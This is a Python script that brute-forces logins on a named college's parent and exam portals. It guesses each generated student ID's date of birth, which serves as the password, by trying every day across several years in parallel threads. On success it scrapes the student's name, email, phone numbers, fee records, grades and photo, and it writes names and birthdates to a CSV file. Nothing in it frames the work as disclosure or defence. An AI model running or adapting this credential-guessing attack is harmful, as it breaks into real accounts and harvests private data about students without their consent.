import pickle
import time
from datetime import date
from typing import Union
from threading import Thread
from urllib.parse import urlparse

from scraper import Scraper, cached, gen_usn


def get_cache():
    try:
        with open('cache1er2344.bin', 'rb') as file:
            return pickle.load(file)
    except FileNotFoundError:
        return {}


def gen_payload() -> dict[str, str]:
    return {
        "username": "",
        "dd": "",
        "mm": "",
        "yyyy": "",
        "passwd": "",
        "remember": "",
        "option": "com_user",
        "task": "login",
        "return": "",
        "ea07d18ec2752bcca07e20a852d96337": "1"
    }


class SisScraper(Scraper):
    def save_cache(self):
        with open('cache1er2344.bin', 'wb') as file:
            pickle.dump(self.get_dob.cache, file)

    def __init__(self, URL="https://parents.msrit.edu/"):
        self.URL = URL + ("/" if URL[-1] != "/" else "")
        super(SisScraper, self).__init__()

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if body.find(id="username") is None: return body

    def get_stats(self, payload) -> dict[str, str]:
        body = self.get_post_body(payload)
        if body is None: return {}
        td = body.find_all("td")
        trs = body.find_all("tbody")[1].find_all("tr")
        return {
            "name": td[0].text.split(":")[1].strip(),
            "usn": payload["username"],
            "dob": payload["passwd"],
            "email": td[1].text.split(":")[1].strip(),
            "sem": td[2].text.split(":")[1].strip(),
            "quota": td[3].text.split(":")[1].strip(),
            "mobile": td[4].text.split(":")[1].strip(),
            "phone": td[5].text.split(":")[1].strip(),
            "course": td[6].text.split(":")[1].strip(),
            "category": td[8].text.split(":")[1].strip(),
            "class": body.find_all("p")[6].text.strip(),
            "batch": td[9].text.split(":")[1].strip(),
            "paid": [tr.find_all("td")[3].text.strip() for tr in trs]
        }

    def get_dept(self, head: str, year: str, dept: str, tolerate: int = 5):
        payload = gen_payload()
        tol = tolerate
        if tol <= 0: return
        payload["username"] = gen_usn(year, dept, roll, head)
        payload["passwd"] = self.get_dob(payload["username"])
        stats = self.get_stats(payload)
        if not stats:
            tol -= 1
        yield stats

    @cached(get_cache())
    def get_dob(self, usn) -> Union[str, None]:
        join_year = int("20" + usn[3:5])
        for year in [y := join_year - 18, y - 1, y + 1, y - 2, y + 2, y - 3, y + 3]:
            if dob := self.brute_year(usn, year): return dob

    @cached(get_cache())
    def brute_year(self, usn: str, year: int) -> Union[str, None]:
        workers = []
        dob = [None]
        for month in range(1, 13):
            worker = Thread(target=self.brute_month, args=(usn, year, month, dob))
            workers.append(worker)
            worker.start()
        for worker in workers:
            worker.join()
        return dob.pop()

    def brute_month(self, usn: str, year: int, month: int, dob_thread: list = None) -> Union[str, None]:
        payload = gen_payload()
        assert (dob_list := isinstance(dob_thread, list)) or dob_thread is None, \
            "dob_thread must be a list, used for threading"
        if dob_list:
            assert len(dob_thread) == 1, \
                "dob_thread must have a single element, used for default value"
        for day in range(1, 32):
            progress = f"Trying {day:02}-{month:02}-{year}"
            print(progress, end="\r")
            if dob_list and len(dob_thread) > 1: return
            payload['username'] = usn.lower()
            payload['passwd'] = f"{year}-{month:02}-{day:02}"
            if self.get_post_body(payload):
                if dob_list: dob_thread.append(payload['passwd'])
                return payload['passwd']

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.save_cache()
        super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)


class ExamScraper(Scraper):
    def __init__(self, url="https://exam.msrit.edu/"):
        self.URL = url + ("/" if url[-1] != "/" else "")
        super(ExamScraper, self).__init__()

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        try:
            _ = body.find_all("h3")[0].text
            return body
        except IndexError:
            return

    def get_stats(self, payload) -> dict[str, str]:
        body = self.get_post_body(payload)
        if body is None: return {}
        url = urlparse(self.URL)
        return {
            "usn": payload["usn"],
            "name": body.find_all("h3")[0].text,
            "sgpa": body.find_all("p")[3].text,
            "photo": f"{url[0]}://{url[1]}" + body.find_all("img")[1]['src'],
        }


def gen_payload1() -> dict[str, str]:
    return {
        "usn": "",
        "osolCatchaTxt": "",
        "osolCatchaTxtInst": "0",
        "option": "com_examresult",
        "task": "getResult"
    }


if __name__ == '__main__':
    with open(f'#dob_checker.csv', 'w+') as f:
        for i in range(1, 35):
            usn = f"1MS22AI{i:03}-T"
            with SisScraper() as SIS:
                t = time.time()
                dob = SIS.get_dob(f"{usn}")
                if dob is None:
                    print(f"{usn} not found")
                    continue
                dobf = date.fromisoformat(dob)
                formated_dob = dobf.strftime("%d/%b/%Y")
                pl = gen_payload()
                pl["username"] = usn
                pl["passwd"] = dob
                stat = SIS.get_stats(pl)
                time2 = time.time() - t
                print(f" {usn} {stat['name']} {formated_dob} Taken time: {time2}")
                towrite = f"{usn}, {stat['name']}, {formated_dob}\n"
                f.write(towrite)
